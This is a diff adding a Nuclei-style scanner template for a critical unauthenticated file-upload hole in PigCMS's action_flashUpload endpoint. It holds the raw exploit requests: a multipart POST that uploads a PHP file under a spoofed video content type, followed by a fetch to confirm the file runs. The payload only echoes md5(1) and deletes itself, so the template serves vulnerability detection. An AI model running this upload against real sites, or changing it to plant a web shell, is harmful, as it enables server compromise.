@@ -1,0 +1,39 @@
+id: pigcms-action_flashUpload-fileupload
+
+info:
+  name: pigcms-action_flashUpload-fileupload
+  author: fitz
+  severity: critical
+  tags: 2023HVV
+
+http:
+  - raw:
+      - |
+        POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----aaa
+        Content-Length: 145
+
+        ------aaa
+        Content-Disposition: form-data; name="filePath"; filename="1.php"
+        Content-Type: video/x-flv
+
+        <?php echo(md5(1));unlink(__FILE__);?>
+        ------aaa
+      - |
+        GET /cms/{{tiqu}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+    extractors:
+      - type: regex
+        name: tiqu
+        part: body
+        internal: true # Required for using dynamic variables
+        regex:
+          - "upload(.*)"
+    matchers:
+      - type: word
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849b"
